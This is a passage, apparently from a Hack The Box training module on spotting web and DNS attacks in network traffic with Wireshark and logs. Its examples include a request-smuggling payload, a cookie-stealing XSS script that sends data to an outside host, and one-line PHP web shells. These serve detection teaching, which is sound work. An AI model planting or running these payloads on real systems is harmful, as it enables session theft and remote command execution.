+<span class="hljs-number">192.168.10.5</span> - - <span class="hljs-string">[18/Jul/2023:12:58:07 -0600]</span> <span class="hljs-string">"<span class="hljs-keyword">GET</span> /.forward HTTP/1.1"</span> <span class="hljs-number">404</span> <span class="hljs-number">435</span> <span class="hljs-string">"-"</span> <span class="hljs-string">"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"</span>
+...SNIP...
+</code></pre>
+<p>And to use awk, we could do the following</p>
+<p>HTTP/HTTPs Service Enumeration</p>
+<pre><code class="lang-shell-session">root@htb<span class="hljs-string">[/htb]</span>$ cat access.log | awk '$<span class="hljs-number">1</span> == <span class="hljs-string">"192.168.10.5"</span>'
+
+<span class="hljs-number">192.168.10.5</span> - - <span class="hljs-string">[18/Jul/2023:12:58:07 -0600]</span> <span class="hljs-string">"<span class="hljs-keyword">GET</span> /randomfile1 HTTP/1.1"</span> <span class="hljs-number">404</span> <span class="hljs-number">435</span> <span class="hljs-string">"-"</span> <span class="hljs-string">"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"</span>
+<span class="hljs-number">192.168.10.5</span> - - <span class="hljs-string">[18/Jul/2023:12:58:07 -0600]</span> <span class="hljs-string">"<span class="hljs-keyword">GET</span> /frand2 HTTP/1.1"</span> <span class="hljs-number">404</span> <span class="hljs-number">435</span> <span class="hljs-string">"-"</span> <span class="hljs-string">"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"</span>
+<span class="hljs-number">192.168.10.5</span> - - <span class="hljs-string">[18/Jul/2023:12:58:07 -0600]</span> <span class="hljs-string">"<span class="hljs-keyword">GET</span> /.bash_history HTTP/1.1"</span> <span class="hljs-number">404</span> <span class="hljs-number">435</span> <span class="hljs-string">"-"</span> <span class="hljs-string">"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"</span>
+<span class="hljs-number">192.168.10.5</span> - - <span class="hljs-string">[18/Jul/2023:12:58:07 -0600]</span> <span class="hljs-string">"<span class="hljs-keyword">GET</span> /.bashrc HTTP/1.1"</span> <span class="hljs-number">404</span> <span class="hljs-number">435</span> <span class="hljs-string">"-"</span> <span class="hljs-string">"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"</span>
+<span class="hljs-number">192.168.10.5</span> - - <span class="hljs-string">[18/Jul/2023:12:58:07 -0600]</span> <span class="hljs-string">"<span class="hljs-keyword">GET</span> /.cache HTTP/1.1"</span> <span class="hljs-number">404</span> <span class="hljs-number">435</span> <span class="hljs-string">"-"</span> <span class="hljs-string">"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"</span>
+<span class="hljs-number">192.168.10.5</span> - - <span class="hljs-string">[18/Jul/2023:12:58:07 -0600]</span> <span class="hljs-string">"<span class="hljs-keyword">GET</span> /.config HTTP/1.1"</span> <span class="hljs-number">404</span> <span class="hljs-number">435</span> <span class="hljs-string">"-"</span> <span class="hljs-string">"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"</span>
+<span class="hljs-number">192.168.10.5</span> - - <span class="hljs-string">[18/Jul/2023:12:58:07 -0600]</span> <span class="hljs-string">"<span class="hljs-keyword">GET</span> /.cvs HTTP/1.1"</span> <span class="hljs-number">404</span> <span class="hljs-number">435</span> <span class="hljs-string">"-"</span> <span class="hljs-string">"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"</span>
+<span class="hljs-number">192.168.10.5</span> - - <span class="hljs-string">[18/Jul/2023:12:58:07 -0600]</span> <span class="hljs-string">"<span class="hljs-keyword">GET</span> /.cvsignore HTTP/1.1"</span> <span class="hljs-number">404</span> <span class="hljs-number">435</span> <span class="hljs-string">"-"</span> <span class="hljs-string">"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"</span>
+<span class="hljs-number">192.168.10.5</span> - - <span class="hljs-string">[18/Jul/2023:12:58:07 -0600]</span> <span class="hljs-string">"<span class="hljs-keyword">GET</span> /.forward HTTP/1.1"</span> <span class="hljs-number">404</span> <span class="hljs-number">435</span> <span class="hljs-string">"-"</span> <span class="hljs-string">"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"</span>
+<span class="hljs-number">192.168.10.5</span> - - <span class="hljs-string">[18/Jul/2023:12:58:07 -0600]</span> <span class="hljs-string">"<span class="hljs-keyword">GET</span> /.git/<span class="hljs-keyword">HEAD</span> HTTP/1.1"</span> <span class="hljs-number">404</span> <span class="hljs-number">435</span> <span class="hljs-string">"-"</span> <span class="hljs-string">"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"</span>
+<span class="hljs-number">192.168.10.5</span> - - <span class="hljs-string">[18/Jul/2023:12:58:07 -0600]</span> <span class="hljs-string">"<span class="hljs-keyword">GET</span> /.history HTTP/1.1"</span> <span class="hljs-number">404</span> <span class="hljs-number">435</span> <span class="hljs-string">"-"</span> <span class="hljs-string">"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"</span>
+<span class="hljs-number">192.168.10.5</span> - - <span class="hljs-string">[18/Jul/2023:12:58:07 -0600]</span> <span class="hljs-string">"<span class="hljs-keyword">GET</span> /.hta HTTP/1.1"</span> <span class="hljs-number">403</span> <span class="hljs-number">438</span> <span class="hljs-string">"-"</span> <span class="hljs-string">"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"</span>
+...SNIP...
+</code></pre>
+<h3 id="finding-other-fuzzing-techniques">Finding Other Fuzzing Techniques</h3>
+<p>However, there are other types of fuzzing which attackers might employ against our web servers. Some of these could include fuzzing dynamic or static elements of our web pages such as id fields. Or in some other cases, the attacker might look for IDOR vulnerabilities in our site, especially if we are handling json parsing (changing <code>return=max</code> to <code>return=min</code>).</p>
+<p>To limit traffic to just one host we can employ the following filter:</p>
+<ul>
+<li><code>http.request and ((ip.src_host == &lt;suspected IP&gt;) or (ip.dst_host == &lt;suspected IP&gt;))</code></li>
+</ul>
+<p><img src="storage\modules\229\4-HTTP-Enum.png" alt="HTTP Enumeration Detected"></p>
+<p>Secondarily, we can always build an overall picture by right clicking any of these requests, going to follow, and follow HTTP stream.</p>
+<p><img src="storage\modules\229\4a-HTTP-Enum.png" alt="HTTP Enumeration Detected"></p>
+<p>Suppose we notice that alot of requests were sent in rapid succession, this would indicate a fuzzing attempt, and we should carry out additional investigative efforts against the host in question.</p>
+<p>However sometimes attackers will do the following to prevent detection</p>
+<ol>
+<li><code>Stagger these responses across a longer period of time.</code></li>
+<li><code>Send these responses from multiple hosts or source addresses.</code></li>
+</ol>
+<h3 id="preventing-fuzzing-attempts">Preventing Fuzzing Attempts</h3>
+<p>We can aim to prevent fuzzing attempts from adversaries by conducting the following actions.</p>
+<ol>
+<li><code>Maintain our virtualhost or web access configurations to return the proper response codes to throw off these scanners.</code></li>
+<li><code>Establish rules to prohibit these IP addresses from accessing our server through our web application firewall.</code></li>
+</ol>
+<h2 id="strange-http-headers">Strange HTTP Headers</h2>
+<p><strong>Related PCAP File(s)</strong>:</p>
+<ul>
+<li><code>CRLF_and_host_header_manipulation.pcapng</code></li>
+</ul>
+<hr>
+<p>We might not notice anything like fuzzing right away when analzying our web server's traffic. However, this does not always indicate that nothing bad is happening. Instead, we can always look a little bit deeper. In order to do so, we might look for strange behavior among HTTP requests. Some of which are weird headers like</p>
+<ol>
+<li><code>Weird Hosts (Host: )</code></li>
+<li><code>Unusual HTTP Verbs</code></li>
+<li><code>Changed User Agents</code></li>
+</ol>
+<h3 id="finding-strange-host-headers">Finding Strange Host Headers</h3>
+<p>In order to start, as we would normally do, we can limit our view in Wireshark to only http replies and requests.</p>
+<ul>
+<li><code>http</code></li>
+</ul>
+<p><img src="storage\modules\229\1-http-headers.png" alt="HTTP Headers"></p>
+<p>Then, we can find any irregular Host headers with the following command. We specify our web server's real IP address to exclude any entries which use this real header. If we were to do this for an external web server, we could specify the domain name here.</p>
+<ul>
+<li><code>http.request and (!(http.host == "192.168.10.7"))</code></li>
+</ul>
+<p><img src="storage\modules\229\2-http-headers.png" alt="HTTP Headers"></p>
+<p>Suppose we noticed that this filter returned some results, we could dig into these HTTP requests a little deeper to find out what hosts these bad actors might have tried to use. We might commonly notice <code>127.0.0.1</code>.</p>
+<p><img src="storage\modules\229\3-http-headers.png" alt="HTTP Headers"></p>
+<p>Or instead something like admin.</p>
+<p><img src="storage\modules\229\4-http-headers.png" alt="HTTP Headers"></p>
+<p>Attackers will attempt to use different host headers to gain levels of access they would not normally achieve through the legitimate host. They may use proxy tools like burp suite or others to modify these before sending them to the server. In order to prevent successful exploitation beyond only detecting these events, we should always do the following.</p>
+<ol>
+<li><code>Ensure that our virtualhosts or access configurations are setup correctly to prevent this form of access.</code></li>
+<li><code>Ensure that our web server is up to date.</code></li>
+</ol>
+<h3 id="analyzing-code-400s-and-request-smuggling">Analyzing Code 400s and Request Smuggling</h3>
+<p>We might also notice some bad responses from our web server, like code 400s. These codes indicate a bad request from the client, so they can be a good place to start when detecting malicious actions via http/https. In order to filter for these, we can use the following</p>
+<ul>
+<li><code>http.response.code == 400</code></li>
+</ul>
+<p><img src="storage\modules\229\6-http-headers.png" alt="HTTP Headers"></p>
+<p>Suppose we were to follow one of these HTTP streams, we might notice the following from the client.</p>
+<p><img src="storage\modules\229\5-http-headers.png" alt="CRLF Attempt"></p>
+<p>This is commonly referred to as HTTP request smuggling or CRLF (Carriage Return Line Feed). Essentially, an attacker will try the following.</p>
+<ul>
+<li><code>GET%20%2flogin.php%3fid%3d1%20HTTP%2f1.1%0d%0aHost%3a%20192.168.10.5%0d%0a%0d%0aGET%20%2fuploads%2fcmd2.php%20HTTP%2f1.1%0d%0aHost%3a%20127.0.0.1%3a8080%0d%0a%0d%0a%20HTTP%2f1.1 Host: 192.168.10.5</code></li>
+</ul>
+<p>Which will be decoded by our server like this.</p>
+<p>Code: decoded</p>
+<pre><code class="lang-url-decoded"><span class="hljs-keyword">GET</span> <span class="hljs-string">/login.php?id=1</span> HTTP/1.1
+<span class="hljs-attribute">Host</span>: 192.168.10.5
+
+<span class="http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/uploads/cmd2.php</span> HTTP/1.1
+<span class="hljs-attribute">Host</span>: 127.0.0.1:8080
+
+<span class="x86asm"> HTTP/<span class="hljs-number">1.1</span>
+<span class="hljs-symbol">Host:</span> <span class="hljs-number">192.168</span><span class="hljs-meta">.10</span><span class="hljs-meta">.5</span></span></span>
+</code></pre>
+<p>Essentially, in cases where our configurations are vulnerable, the first request will go through, and the second request will as well shortly after. This can give an attacker levels of access that we would normally prohibit. This occurs due to our configuration looking like the following.</p>
+<h3 id="apache-configuration">Apache Configuration</h3>
+<p>Code: txt</p>
+<pre><code class="lang-txt"><span class="hljs-section">&lt;VirtualHost *:80&gt;</span>
+
+    <span class="hljs-attribute"><span class="hljs-nomarkup">RewriteEngine</span></span> <span class="hljs-literal">on</span>
+    <span class="hljs-attribute"><span class="hljs-nomarkup">RewriteRule</span></span> <span class="hljs-string">"^/categories/(.*)"</span> <span class="hljs-string">"http://192.168.10.100:8080/categories.php?id=$1"</span><span class="hljs-meta"> [P]</span>
+    <span class="hljs-attribute">ProxyPassReverse</span> <span class="hljs-string">"/categories/"</span> <span class="hljs-string">"http://192.168.10.100:8080/"</span>
+
+<span class="hljs-section">&lt;/VirtualHost&gt;</span>
+</code></pre>
+<p><a href="https://github.com/dhmosfunk/CVE-2023-25690-POC">CVE-2023-25690</a></p>
+<p>As such watching for these code 400s can give clear indication to adversarial actions during our traffic analysis efforts. Additionally, we would notice if an attacker is successful with this attack by finding the code <code>200</code> (<code>success</code>) in response to one of the requests which look like this.</p>
+<h2 id="cross-site-scripting-xss-code-injection-detection">Cross-Site Scripting (XSS) &amp; Code Injection Detection</h2>
+<p><strong>Related PCAP File(s)</strong>:</p>
+<ul>
+<li><code>XSS_Simple.pcapng</code></li>
+</ul>
+<hr>
+<p>Suppose we were looking through our HTTP requests and noticed that a good amount of requests were being sent to an internal "server," we did not recognize. This could be a clear indication of cross-site scripting. Let's take the following output for example.</p>
+<p><img src="storage\modules\229\1-XSS.png" alt="XSS"></p>
+<p>We might notice alot of values being sent over, and in real cases this might not be as obvious that these are user's cookies/tokens. Instead, it might even be encoded or encrypted while it is in transit. Essentially speaking, cross-site scripting works through an attacker injecting malicious javascript or script code into one of our web pages through user input. When other users visit our web server their browsers will execute this code. Attackers in many cases will utilize this technique to steal tokens, cookies, session values, and more. If we were to follow one of these requests it would look like the following.</p>
+<p><img src="storage\modules\229\2-XSS_.png" alt="XSS"></p>
+<p>Getting down to the root of where this code is originating can be somewhat tricky. However, suppose we had a user comment area on our web server. We might notice one of the comments looks like the following.</p>
+<p>Code: javascript</p>
+<pre><code class="lang-javascript"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
+  <span class="hljs-built_in">window</span>.addEventListener(<span class="hljs-string">"load"</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>{
+    <span class="hljs-keyword">const</span> url = <span class="hljs-string">"http://192.168.0.19:5555"</span>;
+    <span class="hljs-keyword">const</span> params = <span class="hljs-string">"cookie="</span> + <span class="hljs-built_in">encodeURIComponent</span>(<span class="hljs-built_in">document</span>.cookie);
+    <span class="hljs-keyword">const</span> request = <span class="hljs-keyword">new</span> XMLHttpRequest();
+    request.open(<span class="hljs-string">"GET"</span>, url + <span class="hljs-string">"?"</span> + params);
+    request.send();
+  });
+</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
+</code></pre>
+<p>This would be successful cross-site scripting from the attacker, and as such we would want to remove this comment quickly, and even in most cases bring our server down to fix the issue before it persists. We might also notice in some cases, that an attacker might attempt to inject code into these fields like the following two examples.</p>
+<p>In order for them to get command and control through PHP.</p>
+<p>Code: php</p>
+<pre><code class="lang-php"><span class="php"><span class="hljs-meta">&lt;?php</span> system($_GET[<span class="hljs-string">'cmd'</span>]); <span class="hljs-meta">?&gt;</span></span>
+</code></pre>
+<p>Or to execute a single command with PHP:</p>
+<p>Code: php</p>
+<pre><code class="lang-php"><span class="php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> `whoami` <span class="hljs-meta">?&gt;</span></span>
+</code></pre>
+<p><strong>Preventing XSS and Code Injection</strong></p>
+<p>In order to prevent these threats after we detect them, we can do the following.</p>
+<ol>
+<li><code>Sanitize and handle user input in an acceptable manner.</code></li>
+<li><code>Do not interpret user input as code.</code></li>
+</ol>
+<h2 id="ssl-renegotiation-attacks">SSL Renegotiation Attacks</h2>
+<p><strong>Related PCAP File(s)</strong>:</p>
+<ul>
+<li><code>SSL_renegotiation_edited.pcapng</code></li>
+</ul>
+<hr>
+<p>Although HTTP traffic is unencrypted, we sometimes will run into encrypted HTTPs traffic. As such, knowing the indicators and signs of malicious HTTPs traffic is crucial to our traffic analysis efforts.</p>
+<h3 id="https-breakdown">HTTPs Breakdown</h3>
+<p>Unlike HTTP, which is a stateless protocol, HTTPs incorporates encryption to provide security for web servers and clients. It does so with thee following</p>
+<ol>
+<li><code>Transport Layer Security (Transport Layer Security)</code></li>
+<li><code>Secure Sockets Layer (SSL)</code></li>
+</ol>
+<p>Generally speaking, when a client establishes a HTTPs connection with a server, it conducts the following</p>
+<ol>
+<li><code>Handshake:</code> The server and client undergo a handshake when establishing an HTTPs connection. During this handshake, the client and server agree upon which encryption algorithms to use, and exchange their certificates.</li>
+<li><code>Encryption</code>: Upon completion of the handshake, the client and the server use the prior agreed upon encryption algorithm to encrypt further data communicated between them.</li>
+<li><code>Further Data Exchange:</code> Once the encrypted connection is established, the client and the server will continue to exchange data between each other. This data could be web pages, images, or other web resources.</li>
+<li><code>Decryption:</code> When the client transmits to the server, or the server transmits to the client, they must decrypt this data with the private and public keys.</li>
+</ol>
+<p>As such, one of the more common HTTPs based attacks are SSL renegotiation, in which an attacker will negotiate the session to the lowest possible encryption standard.</p>
+<p>However there are other encryption attacks we should be aware of like the <code>heartbleed vulnerability</code></p>
+<p><a href="https://heartbleed.com/">The Heartbleed Vulnerability CVE-2014-0160</a></p>
+<hr>
+<h3 id="tls-and-ssl-handshakes">TLS and SSL Handshakes</h3>
+<p>In order to establish an encrypted connection, the client and server must undergo the handshake process. Fortunately for us, TLS and SSL handshakes are mostly similar in their steps.</p>
+<p><img src="storage\modules\229\tls-ssl-handshake.png" alt="TLS Handshakes"></p>
+<p>To break it down further, we might observe the following occur during our traffic analysis efforts.</p>
+<ol>
+<li><code>Client Hello</code> - The initial step is for the client to send its hello message to the server. This message contains information like what TLS/SSL versions are supported by the client, a list of cipher suites (aka encryption algorithms), and random data (nonces) to be used in the following steps.</li>
+<li><code>Server Hello</code> - Responding to the client Hello, the server will send a Server Hello message. This message includes the server's chosen TLS/SSL version, its selected cipher suite from the client's choices, and an additional nonce.</li>
+<li><code>Certificate Exchange</code> - The server then sends its digital certificate to the client, proving its identity. This certificate includes the server's public key, which the client will use to conduct the key exchange process.</li>
+<li><code>Key Exchange</code> - The client then generates what is referred to as the premaster secret. It then encrypts this secret using the server's public key from the certificate and sends it on to the server.</li>
+<li><code>Session Key Derivation</code> - Then both the client and the server use the nonces exchanged in the first two steps, along with the premaster secret to compute the session keys. These session keys are used for symmetric encryption and decryption of data during the secure connection.</li>
+<li><code>Finished Messages</code> - In order to verify the handshake is completed and successful, and also that both parties have derived the same session keys, the client and server exchange finished messages. This message contains the hash of all previous handshake messages and is encrypted using the session keys.</li>
+<li><code>Secure Data Exchange</code> - Now that the handshake is complete, the client and the server can now exchange data over the encrypted channel.</li>
+</ol>
+<p>We can also look at this from a general algorithmic perspective.</p>
+<table>
+<thead>
+<tr>
+<th><strong>Handshake Step</strong></th>
+<th><strong>Relevant Calculations</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>Client Hello</code></td>
+<td><code>ClientHello = { ClientVersion, ClientRandom, Ciphersuites, CompressionMethods }</code></td>
+</tr>
+<tr>
+<td><code>Server Hello</code></td>
+<td><code>ServerHello = { ServerVersion, ServerRandom, Ciphersuite, CompressionMethod</code> }</td>
+</tr>
+<tr>
+<td><code>Certificate Exchange</code></td>
+<td><code>ServerCertificate = { ServerPublicCertificate }</code></td>
+</tr>
+<tr>
+<td><code>Key Exchange</code></td>
+<td><ul><li><code>ClientDHPrivateKey</code></li><li><code>ClientDHPublicKey = DH_KeyGeneration(ClientDHPrivateKey)</code></li><li><code>ClientKeyExchange = { ClientDHPublicKey }</code></li><li><code>ServerDHPrivateKey</code></li><li><code>ServerDHPublicKey = DH_KeyGeneration(ServerDHPrivateKey)</code></li><li><code>ServerKeyExchange = { ServerDHPublicKey }</code></li></ul></td>
+</tr>
+<tr>
+<td><code>Premaster Secret</code></td>
+<td><ul><li><code>PremasterSecret = DH_KeyAgreement(ServerDHPublicKey, ClientDHPrivateKey)</code></li><li><code>PremasterSecret = DH_KeyAgreement(ClientDHPublicKey, ServerDHPrivateKey)</code></li></ul></td>
+</tr>
+<tr>
+<td><code>Session Key Derivation</code></td>
+<td><code>MasterSecret = PRF(PremasterSecret, "master secret", ClientNonce + ServerNonce</code>)</td>
+</tr>
+<tr>
+<td></td>
+<td><code>KeyBlock = PRF(MasterSecret, "key expansion", ServerNonce + ClientNonce)</code></td>
+</tr>
+<tr>
+<td><code>Extraction of Session Keys</code></td>
+<td><ul><li><code>ClientWriteMACKey = First N bytes of KeyBlock</code></li><li><code>ServerWriteMACKey = Next N bytes of KeyBlock</code></li><li><code>ClientWriteKey = Next N bytes of KeyBlock</code></li><li><code>ServerWriteKey = Next N bytes of KeyBlock</code></li><li><code>ClientWriteIV = Next N bytes of KeyBlock</code></li><li><code>ServerWriteIV = Next N bytes of KeyBlock</code></li></ul></td>
+</tr>
+<tr>
+<td><code>Finished Messages</code></td>
+<td><code>FinishedMessage = PRF(MasterSecret, "finished", Hash(ClientHello + ServerHello))</code></td>
+</tr>
+</tbody>
+</table>
+<h3 id="diving-into-ssl-renegotiation-attacks">Diving into SSL Renegotiation Attacks</h3>
+<p>In order to find irregularities in handshakes, we can utilize TCP dump and Wireshark as we have done before. In order to filter to only handshake messages we can use this filter in Wireshark.</p>
+<ul>
+<li><code>ssl.record.content_type == 22</code></li>
+</ul>
+<p>The content type 22 specifies handshake messages only. Specifying this filter we should get a view like the following.</p>
+<p><img src="storage\modules\229\1-HTTPs.png" alt="Handshake Messages"></p>
+<p>When we are looking for SSL renegotiation attacks, we can look for the following.</p>
+<ol>
+<li><code>Multiple Client Hellos</code> - This is the most obvious sign of an SSL renegotiation attack. We will notice multiple client hellos from one client within a short period like above. The attacker repeats this message to trigger renegotiation and hopefully get a lower cipher suite.</li>
+<li><code>Out of Order Handshake Messages</code> - Simply put, sometimes we will see some out of order traffic due to packet loss and others, but in the case of SSL renegotiation some obvious signs would be the server receiving a client hello after completion of the handshake.</li>
+</ol>
+<p>An attacker might conduct this attack against us for the following reasons</p>
+<ol>
+<li><code>Denial of Service</code> - SSL renegotiation attacks consume a ton of resources on the server side, and as such it might overwhelm the server and cause it to be unresponsive.</li>
+<li><code>SSL/TLS Weakness Exploitation</code> - The attacker might attempt renegotiation to potentially exploit vulnerabilities with our current implementation of cipher suites.</li>
+<li><code>Cryptanalysis</code> - The attacker might use renegotiation as a part of an overall strategy to analyze our SSL/TLS patterns for other systems.</li>
+</ol>
+<h2 id="peculiar-dns-traffic">Peculiar DNS Traffic</h2>
+<hr>
+<p>DNS Traffic can be cumbersome to inspect, as many times our clients will generate a ton of it, and abnormalities can sometimes get buried in the mass volume of it. However, understanding DNS and some direct signs of malicious actions is important in our traffic analysis efforts.</p>
+<h3 id="dns-queries">DNS Queries</h3>
+<p>DNS queries are used when a client wants to resolve a domain name with an IP address, or the other way around. First, we can explore the most common type of query, which is forward lookups.</p>
+<p><img src="storage\modules\229\DNS_forward_queries.jpg" alt="DNS Forward Queries"></p>
+<p>Generally speaking, when a client initiates a DNS forward lookup query, it does the following steps.</p>
+<ul>
+<li>Request:<ul>
+<li><code>Where is academy.hackthebox.com?</code></li>
+</ul>
+</li>
+<li>Response:<ul>
+<li><code>Well its at 192.168.10.6</code></li>
+</ul>
+</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th><strong>Step</strong></th>
+<th><strong>Description</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>1. Query Initiation</code></td>
+<td>When the user wants to visit something like academy.hackthebox.com it initiates a DNS forward query.</td>
+</tr>
+<tr>
+<td><code>2. Local Cache Check</code></td>
+<td>The client then checks its local DNS cache to see if it has already resolved the domain name to an IP address. If not it continues with the following.</td>
+</tr>
+<tr>
+<td><code>3. Recursive Query</code></td>
+<td>The client then sends its recursive query to its configured DNS server (local or remote).</td>
+</tr>
+<tr>
+<td><code>4. Root Servers</code></td>
+<td>The DNS resolver, if necessary, starts by querying the root name servers to find the authoritative name servers for the top-level domain (TLD). There are 13 root servers distributed worldwide.</td>
+</tr>
+<tr>
+<td><code>5. TLD Servers</code></td>
+<td>The root server then responds with the authoritative name servers for the TLD (aka .com or .org)</td>
+</tr>
+<tr>
+<td><code>6. Authoritative Servers</code></td>
+<td>The DNS resolver then queries the TLD's authoritative name servers for the second-level domain (aka hackthebox.com).</td>
+</tr>
+<tr>
+<td><code>7. Domain Name's Authoritative Servers</code></td>
+<td>Finally, the DNS resolver queries the domains authoritative name servers to obtain the IP address associated with the requested domain name (aka academy.hackthebox.com).</td>
+</tr>
+<tr>
+<td><code>8. Response</code></td>
+<td>The DNS resolver then receives the IP address (A or AAAA record) and sends it back to the client that initiated the query.</td>
+</tr>
+</tbody>
+</table>
+<p><strong>DNS Reverse Lookups/Queries</strong></p>
+<p>On the opposite side, we have Reverse Lookups. These occur when a client already knows the IP address and wants to find the corresponding FQDN (Fully Qualified Domain Name).</p>
+<ul>
+<li>Request:<ul>
+<li><code>What is your name 192.168.10.6?</code></li>
+</ul>
+</li>
+<li>Response:<ul>
+<li><code>Well its academy.hackthebox.com :)</code></li>
+</ul>
+</li>
+</ul>
+<p>In this case the steps are a bit less complicated.</p>
+<table>
+<thead>
+<tr>
+<th><strong>Step</strong></th>
+<th><strong>Description</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>1. Query Initiation</code></td>
+<td>The client sends a DNS reverse query to its configured DNS resolver (server) with the IP address it wants to find the domain name.</td>
+</tr>
+<tr>
+<td><code>2. Reverse Lookup Zones</code></td>
+<td>The DNS resolver checks if it is authoritative for the reverse lookup zone that corresponds to the IP range as determined by the received IP address. Aka 192.0.2.1, the reverse zone would be 1.2.0.192.in-addr.arpa</td>
+</tr>
+<tr>
+<td><code>3. PTR Record Query</code></td>
+<td>The DNS resolver then looks for a PTR record on the reverse lookup zone that corresponds to the provided IP address.</td>
+</tr>
+<tr>
+<td><code>4. Response</code></td>
+<td>If a matching PTR is found, the DNS server (resolver) then returns the FQDN of the IP for the client.</td>
+</tr>
+</tbody>
+</table>
+<p><img src="storage\modules\229\reverse-dns-lookup-diagram.png" alt="DNS Reverse Queries"></p>
+<h3 id="dns-record-types">DNS Record Types</h3>
+<p>DNS has many different record types responsible for holding different information. We should be familiar with these, especially when monitoring DNS traffic.</p>
+<table>
+<thead>
+<tr>
+<th><strong>Record Type</strong></th>
+<th><strong>Description</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>A</code> (Address)</td>
+<td>This record maps a domain name to an IPv4 address</td>
+</tr>
+<tr>
+<td><code>AAAA</code> (Ipv6 Address)</td>
+<td>This record maps a domain name to an IPv6 address</td>
+</tr>
+<tr>
+<td><code>CNAME</code> (Canonical Name)</td>
+<td>This record creates an alias for the domain name. Aka hello.com = world.com</td>
+</tr>
+<tr>
+<td><code>MX</code> (Mail Exchange)</td>
+<td>This record specifies the mail server responsible for receiving email messages on behalf of the domain.</td>
+</tr>
+<tr>
+<td><code>NS</code> (Name Server)</td>
+<td>This specifies an authoritative name servers for a domain.</td>
+</tr>
+<tr>
+<td><code>PTR</code> (Pointer)</td>
+<td>This is used in reverse queries to map an IP to a domain name</td>
+</tr>
+<tr>
+<td><code>TXT</code> (Text)</td>
+<td>This is used to specify text associated with the domain</td>
+</tr>
+<tr>
+<td><code>SOA</code> (Start of Authority)</td>
+<td>This contains administrative information about the zone</td>
+</tr>
+</tbody>
+</table>
+<h3 id="finding-dns-enumeration-attempts">Finding DNS Enumeration Attempts</h3>
+<p><strong>Related PCAP File(s)</strong>:</p>
+<ul>
+<li><code>dns_enum_detection.pcapng</code></li>
+</ul>
+<p>We might notice a significant amount of DNS traffic from one host when we start to look at our raw output in Wireshark.</p>
+<ul>
+<li><code>dns</code></li>
+</ul>
+<p><img src="storage\modules\229\1-DNSTraffic.png" alt="DNS Traffic"></p>
+<p>We might even notice this traffic concluded with something like <code>ANY</code>:</p>
+<p><img src="storage\modules\229\2-DNSTraffic.png" alt="DNS Traffic"></p>
+<p>This would be a clear indication of DNS enumeration and possibly even subdomain enumeration from an attacker.</p>
+<h3 id="finding-dns-tunneling">Finding DNS Tunneling</h3>
+<p><strong>Related PCAP File(s)</strong>:</p>
+<ul>
+<li><code>dns_tunneling.pcapng</code></li>
+</ul>
+<p>On the other hand, we might notice a good amount of text records from one host. This could indicate DNS tunneling. Like ICMP tunneling, attackers can and have utilized DNS forward and reverse lookup queries to perform data exfiltration. They do so by appending the data they would like to exfiltrate as a part of the TXT field.</p>
+<p>If this was happening it might look like the following.</p>
+<p><img src="storage\modules\229\3-DNSTraffic.png" alt="DNS Traffic"></p>
+<p>If we were to dig a little deeper, we might notice some out of place text on the lower right-hand side of our screen.</p>
+<p><img src="storage\modules\229\4-DNSTraffic.png" alt="DNS Traffic"></p>
+<p>However, in many cases, this data might be encoded or encrypted, and we might notice the following.</p>
+<p><img src="storage\modules\229\5-DNSTraffic.png" alt="DNS Traffic"></p>
+<p>We can retrieve this value from wireshark by locating it like the following and right-clicking the value to specify to copy it.</p>
+<p><img src="storage\modules\229\6-DNSTraffic.png" alt="DNS Traffic"></p>
+<p>Then if we were to go into our Linux machine, in this case we could utilize something like <code>base64 -d</code> to retrieve the true value.</p>
+<p>Peculiar DNS Traffic</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ <span class="hljs-built_in">echo</span> <span class="hljs-string">'VTBaU1EyVXhaSFprVjNocldETnNkbVJXT1cxaU0wb3pXVmhLYTFneU1XeFlNMUp2WVZoT1ptTklTbXhrU0ZJMVdETkNjMXBYUm5wYQpXREJMQ2c9PQo='</span> | base64 <span class="hljs-_">-d</span> 
+
+U0ZSQ2UxZHZkV3hrWDNsdmRWOW1iM0ozWVhKa1gyMWxYM1JvYVhOZmNISmxkSFI1WDNCc1pXRnpaWDBLCg==
+</code></pre>
+<p>However, in some cases attackers will double if not triple encode the value they are attempting to exfiltrate through DNS tunneling, so we might need to do the following.</p>
+<p>Peculiar DNS Traffic</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ <span class="hljs-built_in">echo</span> <span class="hljs-string">'VTBaU1EyVXhaSFprVjNocldETnNkbVJXT1cxaU0wb3pXVmhLYTFneU1XeFlNMUp2WVZoT1ptTklTbXhrU0ZJMVdETkNjMXBYUm5wYQpXREJMQ2c9PQo='</span> | base64 <span class="hljs-_">-d</span> | base64 <span class="hljs-_">-d</span> | base64 <span class="hljs-_">-d</span>
+</code></pre>
+<p>However, we might need to do more than just base64 decode these values, as in many cases as mentioned these values might be encrypted.</p>
+<p>Attackers might conduct DNS tunneling for the following reasons:</p>
+<table>
+<thead>
+<tr>
+<th><strong>Step</strong></th>
+<th><strong>Description</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>1. Data Exfiltration</code></td>
